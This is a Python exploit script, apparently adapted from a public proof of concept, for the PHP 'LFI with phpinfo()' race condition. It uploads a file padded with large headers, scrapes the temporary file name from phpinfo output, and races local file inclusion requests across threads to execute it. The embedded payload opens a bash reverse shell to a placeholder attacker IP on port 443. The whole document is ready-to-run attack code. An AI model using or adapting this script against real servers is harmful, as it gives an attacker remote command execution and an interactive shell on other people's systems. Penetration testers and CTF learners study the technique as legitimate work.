
---

```python
#!/usr/bin/env python3
# Original credits: https://github.com/diegoalbuquerque
# https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
# Adaptado a Python3 para compatibilidad y uso actual por Metahumo

from __future__ import print_function
import sys
import threading
import socket

def setup(host, port):
    TAG = "Security Test"
    PAYLOAD = """%s\r
<?php system("bash -c 'bash -i >& /dev/tcp/<IP_Atacante>/443 0>&1'");?>\r""" % TAG
    REQ1_DATA = (
        "-----------------------------7dbff1ded0714\r\n"
        "Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\r\n"
        "Content-Type: text/plain\r\n"
        "\r\n"
        "%s\r\n"
        "-----------------------------7dbff1ded0714--\r\n"
    ) % PAYLOAD

    padding = "A" * 5000

    content_length = len(REQ1_DATA.encode('utf-8'))
    REQ1 = ( # sustituir 'info.php' por la ruta que proceda
        "POST /info.php?a=" + padding + " HTTP/1.1\r\n"
        "Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=" + padding + "\r\n"
        "HTTP_ACCEPT: " + padding + "\r\n"
        "HTTP_USER_AGENT: " + padding + "\r\n"
        "HTTP_ACCEPT_LANGUAGE: " + padding + "\r\n"
        "HTTP_PRAGMA: " + padding + "\r\n"
        "Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r\n"
        "Content-Length: %s\r\n"
        "Host: %s\r\n"
        "\r\n"
        "%s"
    ) % (content_length, host, REQ1_DATA)

    LFIREQ = ( # sustituir 'index.php?filename' por la ruta que proceda
        "GET /index.php?filename=%s HTTP/1.1\r\n"
        "User-Agent: Mozilla/4.0\r\n"
        "Proxy-Connection: Keep-Alive\r\n"
        "Host: %s\r\n"
        "\r\n"
    )

    return (REQ1, TAG, LFIREQ)


def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((host, port))
        s2.connect((host, port))

        # enviar request phpinfo (bytes)
        s.sendall(phpinforeq.encode('utf-8'))

        # leer suficiente para encontrar tmp_name (rápido)
        d = b""
        while len(d) < max(4096, offset):
            chunk = s.recv(4096)
            if not chunk:
                break
            d += chunk

        # buscar tmp_name en bytes (soporta "&gt;")
        i = d.find(b"[tmp_name] =>")
        if i == -1:
            i = d.find(b"[tmp_name] =&gt;")
        if i == -1:
            return None

        fn = d[i+17:i+31].split()[0].decode('utf-8', errors='ignore')

        # pedir LFI (enviar y leer toda la respuesta)
        s2.sendall((lfireq % (fn, host)).encode('utf-8'))

        d2 = b""
        while True:
            chunk = s2.recv(4096)
            if not chunk:
                break
            d2 += chunk

        if tag.encode('utf-8') in d2:
            return fn

    finally:
        try:
            s.close()
        except Exception:
            pass
        try:
            s2.close()
        except Exception:
            pass

    return None


counter = 0


class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print("\nGot it! Shell created in /tmp/g (filename: %s)" % x)
                    self.event.set()
            except socket.error:
                return


def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the phpinfo output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(phpinforeq.encode('utf-8'))

    d = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        d += chunk
        # detectar final chunked (si aplica)
        if chunk.endswith(b"0\r\n\r\n"):
            break
    s.close()

    i = d.find(b"[tmp_name] =>")
    if i == -1:
        i = d.find(b"[tmp_name] =&gt;")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print("found %s at %i" % (d[i:i+10].decode('utf-8', errors='ignore'), i))
    return i + 256


def main():
    print("LFI With PHPInfo()")
    print("-=" * 30)

    if len(sys.argv) < 2:
        print("Usage: %s host [port] [threads]" % sys.argv[0])
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        print("Error with hostname %s: %s" % (sys.argv[1], e))
        sys.exit(1)

    port = 80
    try:
        port = int(sys.argv[2])
    except (IndexError, ValueError):
        port = 80

    poolsz = 10
    try:
        poolsz = int(sys.argv[3])
    except (IndexError, ValueError):
        poolsz = 10

    print("Getting initial offset...", end=' ')
    reqphp, tag, reqlfi = setup(host, port)
    try:
        offset = getOffset(host, port, reqphp)
    except Exception as e:
        print("\nError obteniendo offset:", e)
        sys.exit(1)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print("Spawning worker pool (%d)..." % poolsz)
    sys.stdout.flush()

    tp = []
    for i in range(0, poolsz):
        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write("\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print()
        if e.is_set():
            print("Woot!  \\m/")
        else:
            print(":(")
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        e.set()

    print("Shuttin' down...")
    for t in tp:
        t.join()


if __name__ == "__main__":
    print("Don't forget to modify the LFI URL")
    main()
```